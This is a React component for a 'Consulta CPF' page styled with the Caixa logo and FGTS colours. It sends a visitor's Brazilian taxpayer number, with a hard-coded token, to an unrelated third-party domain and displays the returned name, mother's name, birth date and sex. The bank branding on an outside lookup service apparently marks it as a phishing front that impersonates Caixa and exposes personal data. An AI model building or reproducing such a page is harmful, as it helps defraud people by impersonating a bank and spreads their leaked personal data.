
import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import CaixaLogo from '@/components/CaixaLogo';
import { useToast } from "@/components/ui/use-toast";

interface CPFData {
  DADOS: {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
  }
}

const CPFCheck = () => {
  const [cpf, setCpf] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [userData, setUserData] = useState<CPFData | null>(null);
  const navigate = useNavigate();
  const { toast } = useToast();

  const formatCPF = (value: string) => {
    // Remove non-digits
    const digits = value.replace(/\D/g, '');
    
    // Format as CPF: XXX.XXX.XXX-XX
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9, 11)}`;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value;
    setCpf(formatCPF(rawValue));
  };

  const checkCPF = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cpf || cpf.replace(/\D/g, '').length < 11) {
      toast({
        title: "CPF inválido",
        description: "Por favor, insira um CPF válido.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    try {
      const cleanCPF = cpf.replace(/\D/g, '');
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${cleanCPF}`);
      
      if (!response.ok) {
        throw new Error('Falha ao consultar CPF');
      }
      
      const data = await response.json();
      setUserData(data);
      
      toast({
        title: "CPF encontrado",
        description: `Bem-vindo, ${data.DADOS.nome}`,
      });
      
      // In a real app, you might navigate to a results page or display the data
      // navigate('/results', { state: { userData: data } });
    } catch (error) {
      console.error('Error checking CPF:', error);
      toast({
        title: "Erro",
        description: "Não foi possível consultar o CPF. Tente novamente mais tarde.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-fgts-pattern min-h-screen flex flex-col relative overflow-hidden">
      <div className="container mx-auto px-6 py-8 flex-1 flex flex-col items-center max-w-md">
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="w-full mt-4 mb-6 flex justify-center"
        >
          <CaixaLogo />
        </motion.div>

        <motion.div 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="text-white text-center mb-6"
        >
          <h1 className="text-xl font-medium">Consulta CPF</h1>
        </motion.div>

        <motion.form
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.3 }}
          className="w-full"
          onSubmit={checkCPF}
        >
          <div className="mb-4">
            <label className="block text-white text-sm mb-2">
              Digite seu CPF:
            </label>
            <input
              type="text"
              value={cpf}
              onChange={handleCPFChange}
              className="w-full bg-transparent border-b-2 border-white text-white px-2 py-2 focus:outline-none"
              placeholder="XXX.XXX.XXX-XX"
              maxLength={14}
              required
            />
          </div>

          <motion.button
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            className="w-full bg-caixa-orange text-white py-4 rounded-md text-lg font-medium shadow-lg hover:bg-opacity-90 transition-all duration-300 mb-3"
            type="submit"
            disabled={isLoading}
          >
            {isLoading ? "Consultando..." : "Consultar CPF"}
          </motion.button>

          <button
            type="button"
            onClick={() => navigate('/login')}
            className="w-full border border-white text-white py-4 rounded-md text-lg font-medium hover:bg-white hover:bg-opacity-10 transition-all duration-300 mb-6"
          >
            Voltar
          </button>
        </motion.form>

        {userData && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-6 bg-white bg-opacity-10 p-4 rounded-lg w-full"
          >
            <h2 className="text-white text-lg font-medium mb-2">Dados encontrados:</h2>
            <div className="text-white">
              <p><strong>Nome:</strong> {userData.DADOS.nome}</p>
              <p><strong>CPF:</strong> {userData.DADOS.cpf}</p>
              <p><strong>Nome da Mãe:</strong> {userData.DADOS.nome_mae}</p>
              <p><strong>Data de Nascimento:</strong> {new Date(userData.DADOS.data_nascimento).toLocaleDateString('pt-BR')}</p>
              <p><strong>Sexo:</strong> {userData.DADOS.sexo === 'M' ? 'Masculino' : 'Feminino'}</p>
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
};

export default CPFCheck;
